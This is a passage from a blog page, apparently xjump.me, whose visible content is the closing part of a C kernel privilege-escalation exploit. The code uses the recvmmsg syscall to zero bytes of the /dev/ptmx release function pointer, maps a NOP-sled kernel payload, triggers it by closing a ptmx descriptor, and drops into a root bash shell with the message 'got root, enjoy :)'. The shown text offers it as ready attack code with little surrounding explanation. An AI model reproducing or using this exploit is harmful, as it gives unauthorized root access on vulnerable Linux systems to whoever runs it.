</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((sockfd = </span><span style="color:#bf616a;">socket</span><span style="color:#c0c5ce;">(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">socket()</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">sa.</span><span style="color:#bf616a;">sin_family </span><span style="color:#c0c5ce;">= AF_INET;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">sa.</span><span style="color:#bf616a;">sin_addr</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">s_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">htonl</span><span style="color:#c0c5ce;">(INADDR_LOOPBACK);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">sa.</span><span style="color:#bf616a;">sin_port </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">htons</span><span style="color:#c0c5ce;">(port);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">waiting 255 seconds...</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">255</span><span style="color:#c0c5ce;">; i++) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(i % </span><span style="color:#d08770;">10 </span><span style="color:#c0c5ce;">== </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">                </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">%i</span><span style="color:#a3be8c;">s/255s</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, i);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">waking up parent...</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">sendto</span><span style="color:#c0c5ce;">(sockfd, buf, BUFSIZE, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, &amp;sa, sizeof(sa));</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_SUCCESS);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">} </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(pid &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">retval = </span><span style="color:#bf616a;">syscall</span><span style="color:#c0c5ce;">(__NR_recvmmsg, sockfd, &amp;msgs, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, (</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)addr);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(retval == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">address can&amp;#39;t be written to, not a valid timespec struct</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">waitpid</span><span style="color:#c0c5ce;">(pid, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">byte zeroed out</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">fork()</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">argc</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">** </span><span style="color:#bf616a;">argv</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;"> code, target;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> pwn;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* Prepare payload... */</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">preparing payload buffer...</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">code = (</span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;">)</span><span style="color:#bf616a;">mmap</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)(TTY_RELEASE &amp; </span><span style="color:#d08770;">0x000000fffffff000LL</span><span style="color:#c0c5ce;">), PAYLOADSIZE, </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x32</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)code, </span><span style="color:#d08770;">0x90</span><span style="color:#c0c5ce;">, PAYLOADSIZE);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">code += PAYLOADSIZE - </span><span style="color:#d08770;">1024</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)code, &amp;kernel_payload, </span><span style="color:#d08770;">1024</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/*</span><span style="color:#65737e;">
</span><span style="color:#65737e;">    </span><span style="color:#65737e;">* Now clear the three most significant bytes of the fops pointer</span><span style="color:#65737e;">
</span><span style="color:#65737e;">    </span><span style="color:#65737e;">* to the release function.</span><span style="color:#65737e;">
</span><span style="color:#65737e;">    </span><span style="color:#65737e;">* This will make it point into the memory region mapped above.</span><span style="color:#65737e;">
</span><span style="color:#65737e;">    </span><span style="color:#65737e;">*/</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">changing kernel pointer to point into controlled buffer...</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">target = PTMX_FOPS + FOPS_RELEASE_OFFSET;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">zero_out</span><span style="color:#c0c5ce;">(target + </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">zero_out</span><span style="color:#c0c5ce;">(target + </span><span style="color:#d08770;">6</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">zero_out</span><span style="color:#c0c5ce;">(target + </span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* ... and trigger. */</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">releasing file descriptor to call manipulated pointer in kernel mode...</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">pwn = </span><span style="color:#bf616a;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/ptmx</span><span style="color:#c0c5ce;">&quot;, &amp;#</span><span style="color:#d08770;">39</span><span style="color:#c0c5ce;">;r&amp;#</span><span style="color:#d08770;">39</span><span style="color:#c0c5ce;">;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">close</span><span style="color:#c0c5ce;">(pwn);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">getuid</span><span style="color:#c0c5ce;">() != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">failed to get root :(</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">got root, enjoy :)</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">execl</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/bash</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">-sh</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span></pre>
    </div>

    
    

    <div class="post-footer">
        
            
                <div class="post-tags">
                    
                        <!-- <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all&#x2F;">#all</a> -->
                    
                </div>
            
            
                <div class="post-nav">
                    
                        <a class="previous" href="https:&#x2F;&#x2F;xjump.me&#x2F;android-jni&#x2F;"> Android &amp; JNI reference</a>
                    
                    
                        <a class="next" href="https:&#x2F;&#x2F;xjump.me&#x2F;object-c-cpp1x-singleton&#x2F;">ObjC &amp; Swift &amp; C++1x Singleton </a>
                    
                    
                    
                </div>
            

        

    </div>

    
    
</article>


                </div>
            </main>

            
            
        </div>

      
          <script type="text/javascript" src="https:&#x2F;&#x2F;xjump.me&#x2F;even.js" ></script>
      
    </body>

</html>
